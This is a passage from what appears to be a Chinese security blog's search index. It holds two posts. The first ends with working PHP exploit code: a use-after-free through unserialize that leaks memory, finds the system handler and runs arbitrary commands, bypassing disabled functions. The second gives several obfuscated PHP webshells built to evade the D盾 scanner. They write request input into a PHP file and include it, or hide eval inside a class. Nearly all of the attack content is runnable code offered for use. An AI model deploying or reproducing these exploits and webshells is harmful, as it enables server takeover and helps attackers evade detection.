&lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$text_size</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$text_size</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ryat</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$chtg</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;chtg = <span class="hljs-variable language_">$this</span>-&gt;ryat;<br>            <span class="hljs-variable language_">$this</span>-&gt;ryat = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>);<br>    <span class="hljs-variable">$poc</span> = <span class="hljs-string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$poc</span>);<br>    <span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br>    <span class="hljs-variable">$v</span> = [];<br>    <span class="hljs-variable">$v</span>[<span class="hljs-number">0</span>] = <span class="hljs-title function_ invoke__">ptr2str</span>(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$v</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$out</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br>    <span class="hljs-comment"># fake value</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br>    <span class="hljs-comment"># fake reference</span><br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>       <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br>    <span class="hljs-comment"># pwn</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>命令执行</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP小马免杀的浅谈[过最新D盾]</title>
    <link href="/2021/07/31/%E6%B5%85%E8%B0%88PHP%E5%B0%8F%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/"/>
    <url>/2021/07/31/%E6%B5%85%E8%B0%88PHP%E5%B0%8F%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="思路1-使用写文件的函数写出另一个php文件然后include-x2F-require-回来执行"><a href="#思路1-使用写文件的函数写出另一个php文件然后include-x2F-require-回来执行" class="headerlink" title="思路1:使用写文件的函数写出另一个php文件然后include&#x2F;require 回来执行"></a>思路1:使用写文件的函数写出另一个php文件然后include&#x2F;require 回来执行</h2><h3 id="方法1-File-put-content"><a href="#方法1-File-put-content" class="headerlink" title="方法1:File_put_content"></a>方法1:File_put_content</h3><p><img src="/images/%E6%B5%85%E8%B0%88PHP%E5%B0%8F%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/1.png"><br><img src="/images/%E6%B5%85%E8%B0%88PHP%E5%B0%8F%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/2.png"><br>D盾还是报了，但<strong>如果是PHP7.0以上的，还是有绕过方法</strong>滴:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">T00ls.net shadowwolf</span><br><span class="hljs-comment">2021-7-25</span><br><span class="hljs-comment">*/</span><br>( ~<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C&quot;</span>))(<span class="hljs-string">&#x27;oagi.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php &#x27;</span>.<span class="hljs-variable">$_GET</span>[a].<span class="hljs-string">&#x27; ?&gt;&#x27;</span>);<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;oagi.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注:使用GET仅是因为测试直观方便&#x3D; &#x3D;<br>完全可以改成POST来的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">T00ls.net shadowwolf</span><br><span class="hljs-comment">2021-7-25</span><br><span class="hljs-comment">*/</span><br>( ~<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C&quot;</span>))(<span class="hljs-string">&#x27;oagi.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php &#x27;</span>.<span class="hljs-variable">$_POST</span>[a].<span class="hljs-string">&#x27; ?&gt;&#x27;</span>);<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;oagi.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/images/%E6%B5%85%E8%B0%88PHP%E5%B0%8F%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/3.png"></p><h3 id="方法2-使用fwrite"><a href="#方法2-使用fwrite" class="headerlink" title="方法2 使用fwrite"></a>方法2 使用fwrite</h3><pre><code>同理 使用fwrite也是一样的</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;oagi.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;&lt;?php &quot;</span>.<span class="hljs-variable">$_POST</span>[a].<span class="hljs-string">&#x27; ?&gt;&#x27;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/%E6%B5%85%E8%B0%88PHP%E5%B0%8F%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/4.png"><br>也是过D盾</p><h2 id="思路2-防止被识别成可疑eval"><a href="#思路2-防止被识别成可疑eval" class="headerlink" title="思路2 防止被识别成可疑eval"></a>思路2 防止被识别成可疑eval</h2><h3 id="方法1-用-class-包裹起来"><a href="#方法1-用-class-包裹起来" class="headerlink" title="方法1 用(class{}) 包裹起来"></a>方法1 用(class{}) 包裹起来</h3><pre><code>在function或者是直接用的eval会被识别成可疑eval所以我们不在function或者是裸露的条件下如&lt;?php eval($_POST[a]);?&gt;是十分重要的所以我们用类来包裹</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">T00ls.net</span><br><span class="hljs-comment">shadowwolf</span><br><span class="hljs-comment">2021-7-25</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$command_</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"><span class="hljs-variable">$command</span></span>)</span>&#123;<br><span class="hljs-variable">$command_</span>=~<span class="hljs-variable">$command</span>;<br><span class="hljs-variable">$command</span> =~<span class="hljs-variable">$command_</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$command</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">b</span>(<span class="hljs-variable">$_POST</span>[a]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/%E6%B5%85%E8%B0%88PHP%E5%B0%8F%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/5.png"></p><p>同样 也是过D盾的</p><p>暂时就这么多QAQ</p>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
